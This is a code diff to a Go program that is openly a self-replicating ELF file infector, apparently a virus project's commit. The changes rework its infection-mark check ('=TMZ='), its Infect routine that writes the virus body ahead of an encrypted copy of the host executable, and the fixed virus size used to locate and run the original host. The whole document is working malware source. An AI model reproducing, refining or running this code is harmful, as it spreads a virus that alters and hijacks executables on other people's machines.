@@ -24,8 +24,6 @@ package main
 
 import (
     "bufio"
-    "fmt"
-    "io"
     "io/ioutil"
     "os"
     "os/exec"
@@ -65,49 +63,56 @@ func CheckELF(file string) bool {
 func CheckInfected(file string) bool {
 
     _mark := "=TMZ=" //infection mark
-     fi, err := os.Open(file)
-    check(err)
-    buf := make([]byte, 5)
-    
-    for {
-        // read a chunk of 5 bytes
-        _, err := fi.Read(buf)
-        if err != nil {
-            if err == io.EOF {
-                break //exits when we reach EOF
-            }
-            fmt.Println(err)
-        }
-        
-        if string(buf) == _mark { //if chunk = mark
-            fi.Close()    
-            return true //file is already infected!
-            break
-        }
-        
-    }    
-    fi.Close()
-    return false //not infected
+ 	fi, err := os.Open(file)
+	check(err)
+	myStat, err := fi.Stat()
+    check(err)	
+	size := myStat.Size()
+	
+	buf := make([]byte, size)
+	fi.Read(buf)
+	fi.Close()
+	var x int64
+	for x = 1; x < size; x++ {
+        if buf[x] == _mark[0] {
+			var y int64           
+            for y = 1; y < int64(len(_mark)); y++ {
+                if (x + y) >= size {
+                        break
+					}
+                    if buf[x + y] != _mark[y] {
+                            break
+					}
+                }
+                if y == int64(len(_mark)) {
+                    return true; //infected!
+                }
+			}
+		}
+    return false; //not infected
     
 }
 
 func Infect(file string) {
 
     dat, err := ioutil.ReadFile(file) //read host
-    check(err)    
-    vir, err := ioutil.ReadFile(os.Args[0]) //read virus
+	check(err)	
+	vir, err := os.Open(os.Args[0]) //read virus
+	check(err)
+	virbuf := make([]byte, 1838080)
+	vir.Read(virbuf)
+	
+	encDat := Encrypt(dat) //encrypt host
+	
+	f, err := os.OpenFile(file, os.O_RDWR, 0666) //open host
     check(err)
-    
-    encDat := Encrypt(dat) //encrypt host
-    
-    f, err := os.OpenFile(file, os.O_RDWR , 0666) //open host
-    check(err)
-    
-    w := bufio.NewWriter(f)
-    w.Write(vir) //write virus
-    w.Write(encDat) //write encypted host
+	
+  	w := bufio.NewWriter(f)
+	w.Write(virbuf) //write virus
+	w.Write(encDat) //write encypted host
     w.Flush() //make sure we are all set
-    f.Close()
+	f.Close()
+	vir.Close()
 }
    
 func RunHost() {
@@ -120,12 +125,12 @@ func RunHost() {
     infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
     check(err)
     allSZ := len(infected_data) //get file full size
-    hostSZ := allSZ - 2664960 //calculate host size
+    hostSZ := allSZ - 1838080 //calculate host size
     
     f, err := os.Open(os.Args[0]) //open host
     check(err)
         
-    f.Seek(2664960, os.SEEK_SET) //go to host start
+    f.Seek(1838080, os.SEEK_SET) //go to host start
     
     hostBuf := make([]byte, hostSZ)
     f.Read(hostBuf) //read it
@@ -223,7 +228,7 @@ func main() {
 	}
 
         
-    if GetSz(os.Args[0]) > 2664960 {
+    if GetSz(os.Args[0]) > 1838080 {
         RunHost()
     } else {
         os.Exit(0)
